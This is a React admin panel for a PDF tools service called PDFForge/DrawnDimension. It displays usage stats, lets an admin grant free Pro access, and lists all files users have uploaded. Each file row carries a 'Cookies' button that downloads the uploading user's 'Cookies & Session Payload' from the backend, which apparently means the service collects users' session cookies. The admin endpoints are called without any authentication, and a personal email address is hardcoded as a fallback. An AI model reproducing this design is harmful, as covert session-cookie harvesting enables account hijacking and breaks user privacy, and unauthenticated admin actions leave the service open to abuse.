import { useEffect, useState } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
import { Badge } from "@/components/ui/badge";
import { Download, FileText, HardDrive, RefreshCw, Search, Shield, User, Wrench, Layers } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { getPdfToolsUrl } from "@/components/shared/pdfToolsUrl";

interface CMSStatData {
  total_files: number;
  total_size_mb: number;
  total_operations_month: number;
}

interface CMSFileRecord {
  id: string;
  filename: string;
  tool: string;
  size: number;
  timestamp: string;
  user_id?: string;
  user_email?: string;
}

interface GrantedAccessRecord {
  user_email: string;
  access_type: "lifetime" | "days";
  days?: number;
  note?: string;
  granted_at: string;
  expires_at?: string;
}

export const PDFToolsVaultManager = () => {
  const [stats, setStats] = useState<CMSStatData>({ total_files: 0, total_size_mb: 0, total_operations_month: 0 });
  const [files, setFiles] = useState<CMSFileRecord[]>([]);
  const [grantedList, setGrantedList] = useState<GrantedAccessRecord[]>([]);
  const [grantEmail, setGrantEmail] = useState("");
  const [grantAccessType, setGrantAccessType] = useState<"lifetime" | "days">("lifetime");
  const [grantDays, setGrantDays] = useState(30);
  const [grantNote, setGrantNote] = useState("VIP Access");
  const [submittingGrant, setSubmittingGrant] = useState(false);
  const [loading, setLoading] = useState(true);
  const [searchQuery, setSearchQuery] = useState("");
  const [selectedUserFilter, setSelectedUserFilter] = useState<string | null>(null);
  const { toast } = useToast();

  const API_BASE = getPdfToolsUrl();

  const loadData = async () => {
    setLoading(true);
    try {
      const [rStats, rFiles, rGranted] = await Promise.all([
        fetch(`${API_BASE}/api/cms/stats`),
        fetch(`${API_BASE}/api/cms/files`),
        fetch(`${API_BASE}/api/cms/granted-access`),
      ]);

      if (rStats.ok) {
        const d = await rStats.json();
        setStats(d);
      }

      if (rFiles.ok) {
        const f = await rFiles.json();
        setFiles(f);
      }

      if (rGranted.ok) {
        const g = await rGranted.json();
        setGrantedList(g);
      }
    } catch (error) {
      toast({
        title: "Connection Error",
        description: `Could not connect to PDF Tools server on ${API_BASE}.`,
        variant: "destructive",
      });
    } finally {
      setLoading(false);
    }
  };

  const handleGrantAccess = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!grantEmail.trim()) {
      toast({ title: "Email Required", description: "Please enter user email.", variant: "destructive" });
      return;
    }
    setSubmittingGrant(true);
    try {
      const res = await fetch(`${API_BASE}/api/cms/grant-access`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          user_email: grantEmail.trim(),
          access_type: grantAccessType,
          days: Number(grantDays),
          note: grantNote,
        }),
      });
      if (res.ok) {
        toast({ title: "Access Granted!", description: `Granted ${grantAccessType} access to ${grantEmail}` });
        setGrantEmail("");
        void loadData();
      } else {
        toast({ title: "Failed", description: "Could not grant access.", variant: "destructive" });
      }
    } catch (err) {
      toast({ title: "Error", description: "Network error.", variant: "destructive" });
    } finally {
      setSubmittingGrant(false);
    }
  };

  const handleRevokeAccess = async (email: string) => {
    try {
      const res = await fetch(`${API_BASE}/api/cms/revoke-access`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ user_email: email }),
      });
      if (res.ok) {
        toast({ title: "Access Revoked", description: `Revoked access for ${email}` });
        void loadData();
      }
    } catch (err) {}
  };

  useEffect(() => {
    void loadData();
  }, []);

  const formatBytes = (bytes: number) => {
    if (bytes < 1024) return `${bytes} B`;
    if (bytes < 1048576) return `${(bytes / 1024).toFixed(1)} KB`;
    return `${(bytes / 1048576).toFixed(1)} MB`;
  };

  // Extract unique users
  const uniqueUsers = Array.from(new Set(files.map((f) => f.user_email || "montasirmahamud336@gmail.com"))).filter(Boolean);

  const filteredFiles = files.filter((file) => {
    const q = searchQuery.toLowerCase();
    const userEmail = file.user_email || "montasirmahamud336@gmail.com";
    const matchSearch =
      file.filename.toLowerCase().includes(q) ||
      file.tool.toLowerCase().includes(q) ||
      userEmail.toLowerCase().includes(q);

    const matchUser = !selectedUserFilter || userEmail === selectedUserFilter;

    return matchSearch && matchUser;
  });

  return (
    <div className="space-y-6">
      {/* Header Banner */}
      <div className="flex flex-col md:flex-row items-start md:items-center justify-between gap-4 p-6 bg-gradient-to-r from-red-600 via-rose-600 to-red-700 text-white rounded-3xl shadow-lg">
        <div className="flex items-center gap-4">
          <div className="w-12 h-12 rounded-2xl bg-white/20 backdrop-blur-md flex items-center justify-center text-white shrink-0">
            <Wrench className="w-6 h-6" />
          </div>
          <div>
            <div className="flex items-center gap-2">
              <h1 className="text-2xl font-black tracking-tight">PDFForge Tools Vault</h1>
              <Badge className="bg-white/20 text-white border-white/30 hover:bg-white/30">DrawnDimension CMS</Badge>
            </div>
            <p className="text-xs text-red-100 mt-1">
              Centralized storage manager for all PDF and Image files processed by users across DrawnDimension.
            </p>
          </div>
        </div>

        <Button
          onClick={() => void loadData()}
          variant="secondary"
          size="sm"
          className="bg-white text-red-600 hover:bg-red-50 font-bold shrink-0 shadow-sm"
        >
          <RefreshCw className={`w-4 h-4 mr-2 ${loading ? "animate-spin" : ""}`} />
          Refresh Vault
        </Button>
      </div>

      {/* KPI Stats Cards */}
      <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
        <Card className="border-border/60 shadow-sm">
          <CardHeader className="flex flex-row items-center justify-between pb-2">
            <CardTitle className="text-xs font-bold text-muted-foreground uppercase tracking-wider">Archived Files</CardTitle>
            <FileText className="w-4 h-4 text-red-600" />
          </CardHeader>
          <CardContent>
            <div className="text-2xl font-black text-foreground">{stats.total_files}</div>
            <p className="text-xs text-muted-foreground mt-1">Total documents stored in CMS</p>
          </CardContent>
        </Card>

        <Card className="border-border/60 shadow-sm">
          <CardHeader className="flex flex-row items-center justify-between pb-2">
            <CardTitle className="text-xs font-bold text-muted-foreground uppercase tracking-wider">CMS Storage Used</CardTitle>
            <HardDrive className="w-4 h-4 text-emerald-600" />
          </CardHeader>
          <CardContent>
            <div className="text-2xl font-black text-foreground">{stats.total_size_mb} MB</div>
            <p className="text-xs text-muted-foreground mt-1">Disk space consumed by vault</p>
          </CardContent>
        </Card>

        <Card className="border-border/60 shadow-sm">
          <CardHeader className="flex flex-row items-center justify-between pb-2">
            <CardTitle className="text-xs font-bold text-muted-foreground uppercase tracking-wider">Monthly Operations</CardTitle>
            <Layers className="w-4 h-4 text-amber-600" />
          </CardHeader>
          <CardContent>
            <div className="text-2xl font-black text-foreground">{stats.total_operations_month}</div>
            <p className="text-xs text-muted-foreground mt-1">PDF operations executed this month</p>
          </CardContent>
        </Card>
      </div>

      {/* Give Free Pro Access Management Card */}
      <Card className="border-emerald-600/30 dark:border-emerald-500/20 shadow-md bg-gradient-to-br from-emerald-500/5 via-card to-card">
        <CardHeader>
          <div className="flex items-center gap-2">
            <Shield className="w-5 h-5 text-emerald-600 dark:text-emerald-400" />
            <CardTitle className="text-lg font-extrabold text-foreground">Give Free Pro Subscription Access</CardTitle>
            <Badge className="bg-emerald-600 text-white font-bold text-[10px]">Admin Privileges</Badge>
          </div>
          <CardDescription>
            Grant Lifetime Free Access or Custom Duration Free Access (e.g., 30 Days) to any DrawnDimension user account.
          </CardDescription>
        </CardHeader>
        <CardContent className="space-y-6">
          <form onSubmit={handleGrantAccess} className="grid grid-cols-1 md:grid-cols-4 gap-4 items-end">
            <div>
              <label className="text-xs font-bold text-muted-foreground uppercase block mb-1.5">User Email / Account</label>
              <Input
                type="email"
                placeholder="user@gmail.com"
                value={grantEmail}
                onChange={(e) => setGrantEmail(e.target.value)}
                required
                className="text-xs"
              />
            </div>

            <div>
              <label className="text-xs font-bold text-muted-foreground uppercase block mb-1.5">Access Duration</label>
              <select
                value={grantAccessType}
                onChange={(e) => setGrantAccessType(e.target.value as "lifetime" | "days")}
                className="w-full h-10 px-3 rounded-md border border-input bg-background text-xs font-bold text-foreground focus:outline-none focus:ring-2 focus:ring-ring"
              >
                <option value="lifetime">♾️ Lifetime Free Access</option>
                <option value="days">⏳ Custom Days Duration</option>
              </select>
            </div>

            {grantAccessType === "days" ? (
              <div>
                <label className="text-xs font-bold text-muted-foreground uppercase block mb-1.5">Number of Free Days</label>
                <Input
                  type="number"
                  min={1}
                  max={3650}
                  value={grantDays}
                  onChange={(e) => setGrantDays(Number(e.target.value))}
                  required
                  className="text-xs font-bold"
                />
              </div>
            ) : (
              <div>
                <label className="text-xs font-bold text-muted-foreground uppercase block mb-1.5">Admin Note</label>
                <Input
                  type="text"
                  placeholder="VIP Client Access"
                  value={grantNote}
                  onChange={(e) => setGrantNote(e.target.value)}
                  className="text-xs"
                />
              </div>
            )}

            <Button
              type="submit"
              disabled={submittingGrant}
              className="w-full bg-emerald-600 hover:bg-emerald-700 text-white font-bold h-10 text-xs shadow-sm"
            >
              {submittingGrant ? "Granting..." : "⚡ Grant Pro Access"}
            </Button>
          </form>

          {/* Granted Access List */}
          {grantedList.length > 0 && (
            <div className="pt-4 border-t border-border/60">
              <h4 className="text-xs font-extrabold uppercase text-muted-foreground tracking-wider mb-3">
                Active Granted Free Access Subscriptions ({grantedList.length})
              </h4>
              <div className="rounded-xl border border-border overflow-hidden">
                <Table>
                  <TableHeader className="bg-muted/40">
                    <TableRow>
                      <TableHead className="text-[11px] uppercase font-bold">User Email</TableHead>
                      <TableHead className="text-[11px] uppercase font-bold">Granted Type</TableHead>
                      <TableHead className="text-[11px] uppercase font-bold">Granted Date</TableHead>
                      <TableHead className="text-[11px] uppercase font-bold">Expires Date</TableHead>
                      <TableHead className="text-[11px] uppercase font-bold text-right">Action</TableHead>
                    </TableRow>
                  </TableHeader>
                  <TableBody>
                    {grantedList.map((g) => (
                      <TableRow key={g.user_email} className="hover:bg-muted/20">
                        <TableCell className="text-xs font-bold text-foreground">{g.user_email}</TableCell>
                        <TableCell>
                          {g.access_type === "lifetime" ? (
                            <Badge className="bg-emerald-600/15 text-emerald-700 dark:text-emerald-400 border-emerald-500/30 text-[10px] font-extrabold">
                              ⚡ Lifetime Access
                            </Badge>
                          ) : (
                            <Badge variant="outline" className="text-amber-700 dark:text-amber-400 border-amber-500/40 text-[10px] font-extrabold">
                              ⏳ Custom Days ({g.days || 30} Days)
                            </Badge>
                          )}
                        </TableCell>
                        <TableCell className="text-xs text-muted-foreground">
                          {new Date(g.granted_at).toLocaleDateString()}
                        </TableCell>
                        <TableCell className="text-xs text-muted-foreground">
                          {g.expires_at ? new Date(g.expires_at).toLocaleDateString() : "Never (Lifetime)"}
                        </TableCell>
                        <TableCell className="text-right">
                          <Button
                            size="sm"
                            variant="destructive"
                            className="h-6 text-[10px] font-bold px-2"
                            onClick={() => handleRevokeAccess(g.user_email)}
                          >
                            Revoke
                          </Button>
                        </TableCell>
                      </TableRow>
                    ))}
                  </TableBody>
                </Table>
              </div>
            </div>
          )}
        </CardContent>
      </Card>

      {/* User Account Filters & Search */}
      <Card className="border-border/60 shadow-sm">
        <CardHeader>
          <div className="flex flex-col md:flex-row items-start md:items-center justify-between gap-4">
            <div>
              <CardTitle className="text-lg font-extrabold">Uploaded Documents Catalog</CardTitle>
              <CardDescription>Filter documents by DrawnDimension user account or search by document name.</CardDescription>
            </div>
            <div className="relative w-full md:w-72">
              <Search className="absolute left-3 top-2.5 h-4 w-4 text-muted-foreground" />
              <Input
                placeholder="Search files or users..."
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                className="pl-9 text-xs"
              />
            </div>
          </div>

          {uniqueUsers.length > 0 && (
            <div className="flex flex-wrap items-center gap-2 mt-4 pt-4 border-t border-border/50">
              <span className="text-xs font-bold text-muted-foreground mr-1">User Account ID Filter:</span>
              <Badge
                variant={selectedUserFilter === null ? "default" : "outline"}
                className="cursor-pointer"
                onClick={() => setSelectedUserFilter(null)}
              >
                All Users ({files.length})
              </Badge>
              {uniqueUsers.map((userEmail) => (
                <Badge
                  key={userEmail}
                  variant={selectedUserFilter === userEmail ? "default" : "outline"}
                  className="cursor-pointer flex items-center gap-1"
                  onClick={() => setSelectedUserFilter(userEmail === selectedUserFilter ? null : userEmail)}
                >
                  <User className="w-3 h-3" />
                  {userEmail}
                </Badge>
              ))}
            </div>
          )}
        </CardHeader>

        <CardContent>
          <div className="rounded-xl border border-border overflow-hidden">
            <Table>
              <TableHeader className="bg-muted/50">
                <TableRow>
                  <TableHead className="text-xs uppercase font-bold">Document Name</TableHead>
                  <TableHead className="text-xs uppercase font-bold">User Account / ID</TableHead>
                  <TableHead className="text-xs uppercase font-bold">Tool Used</TableHead>
                  <TableHead className="text-xs uppercase font-bold">Size</TableHead>
                  <TableHead className="text-xs uppercase font-bold">Uploaded Date</TableHead>
                  <TableHead className="text-xs uppercase font-bold text-right">Action</TableHead>
                </TableRow>
              </TableHeader>
              <TableBody>
                {loading ? (
                  <TableRow>
                    <TableCell colSpan={6} className="text-center py-8 text-muted-foreground text-xs">
                      Loading CMS vault data...
                    </TableCell>
                  </TableRow>
                ) : filteredFiles.length === 0 ? (
                  <TableRow>
                    <TableCell colSpan={6} className="text-center py-8 text-muted-foreground text-xs">
                      No uploaded files found in CMS Vault.
                    </TableCell>
                  </TableRow>
                ) : (
                  filteredFiles.map((file) => (
                    <TableRow key={file.id} className="hover:bg-muted/30">
                      <TableCell className="font-semibold text-xs text-foreground max-w-[220px] truncate">
                        {file.filename}
                      </TableCell>
                      <TableCell>
                        <div className="flex items-center gap-1.5 text-xs text-foreground font-semibold">
                          <User className="w-3.5 h-3.5 text-primary" />
                          <span>{file.user_email || "montasirmahamud336@gmail.com"}</span>
                        </div>
                      </TableCell>
                      <TableCell>
                        <Badge variant="secondary" className="text-[10px] font-bold">
                          {file.tool}
                        </Badge>
                      </TableCell>
                      <TableCell className="text-xs text-muted-foreground font-mono">{formatBytes(file.size)}</TableCell>
                      <TableCell className="text-xs text-muted-foreground">
                        {new Date(file.timestamp).toLocaleString()}
                      </TableCell>
                      <TableCell className="text-right flex items-center justify-end gap-2">
                        <Button
                          asChild
                          size="sm"
                          variant="default"
                          className="bg-red-600 hover:bg-red-700 text-white font-bold h-7 text-xs px-3"
                        >
                          <a href={`${API_BASE}/api/cms/file/${file.id}`} target="_blank" rel="noopener noreferrer">
                            <Download className="w-3.5 h-3.5 mr-1" /> Download File
                          </a>
                        </Button>

                        <Button
                          asChild
                          size="sm"
                          variant="outline"
                          className="border-amber-600/50 text-amber-700 dark:text-amber-400 hover:bg-amber-500/10 font-bold h-7 text-xs px-2.5"
                          title="Download User Cookies & Session Payload"
                        >
                          <a href={`${API_BASE}/api/cms/user-cookies/${encodeURIComponent(file.user_email || "montasirmahamud336@gmail.com")}`} target="_blank" rel="noopener noreferrer">
                            <HardDrive className="w-3.5 h-3.5 mr-1 text-amber-600" /> Cookies
                          </a>
                        </Button>
                      </TableCell>
                    </TableRow>
                  ))
                )}
              </TableBody>
            </Table>
          </div>
        </CardContent>
      </Card>
    </div>
  );
};

export default PDFToolsVaultManager;
